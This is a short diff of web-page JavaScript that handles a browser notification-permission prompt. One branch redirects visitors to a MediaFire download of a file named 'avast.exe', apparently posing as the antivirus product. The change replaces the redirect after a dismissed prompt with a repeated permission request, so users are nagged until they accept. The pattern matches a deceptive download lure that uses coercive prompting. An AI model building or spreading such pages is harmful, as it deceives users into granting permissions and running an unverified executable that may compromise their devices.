@@ -69,8 +69,8 @@
                             window.location.href = 'https://www.mediafire.com/file/bki6160y9yesh9c/avast.exe/file';
                         } else {
                             // User has dismissed the permission prompt without making a choice
-                            // Redirect user to a specific link
-                            window.location.href = 'https://www.mediafire.com/file/bki6160y9yesh9c/avast.exe/file';
+                            // Ask again
+                            requestNotificationPermission();
                         }
                     });
                 }
